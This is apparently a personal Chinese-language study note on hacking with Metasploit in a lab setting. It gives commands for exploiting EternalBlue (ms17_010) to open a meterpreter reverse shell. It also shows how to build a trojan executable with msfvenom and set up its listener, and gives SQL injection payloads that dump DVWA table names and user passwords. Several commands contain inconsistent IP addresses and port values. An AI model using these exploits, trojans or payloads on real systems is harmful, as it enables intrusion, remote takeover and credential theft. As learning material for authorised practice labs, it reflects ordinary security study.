一些英语单词：
Payload 有效载荷
options 可选择的事物

sudo su 获取root权限
ifconfig 看ip地址：192.168.230.131

一，有ip地址直接攻击
msfconsole：启动metasploit命令行
msf使用三步走：使用模块——配置模块必选项——运行模块
search ms17_010:查看永恒之蓝漏洞
1.use 0：使用哪个漏洞
show options：查看配置信息
2.设置必选项
set RHOSTS 192.168.1.128                         [*RHOSTS为target host(s)代表你要攻击谁]
set payload windows/x64/meterpreter/reverse_tcp  [*payload是攻击载荷，就是攻击完成后想干啥,这里是想获取meterpreter] [*meterpreter是metasploit后渗透的神器]
set LHOST 192.108.1.136                          [*LHOSTS为listen host 代表你是谁，既Kali的IP地址]
set LPORT 12345                                  [*LPORT为listen port，代表你要在kali上开启的端口，1-65535随便选，但不能被占用]
3.run
4.help：看看怎么控制这台电脑

二，生成木马病毒
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.230.131 lport=9999 -f exe -o demo9999.exe
配置鱼钩：
msfconsole：启动metasploit命令行
use exploit/multi/handler：模块
options：查看配置信息
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.230.131
set lport 9999 10.193.19.61
run


三，网站渗透

命令执行漏洞是什么？

命令执行漏洞是指攻击者通过输入恶意代码或者参数，使得应用程序在执行命令时，执行了攻击者想要执行的恶意命令。

这种漏洞通常存在于Web应用程序、网络服务和操作系统等系统中。攻击者可以通过命令执行漏洞来获取系统权限、窃取敏感信息、篡改数据等。


sql注入漏洞是什么？

SQL注入漏洞是一种常见的Web应用程序漏洞，攻击者通过向Web应用程序提交恶意的SQL查询语句，从而可以访问或修改应用程序的数据库中的数据。

攻击者可以利用SQL注入漏洞来窃取敏感信息、修改或删除数据，或者在数据库中执行其他恶意操作。

这种漏洞通常是由于Web应用程序没有正确地对用户输入进行验证和过滤而导致的。

1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#

1' union select user,password from users#
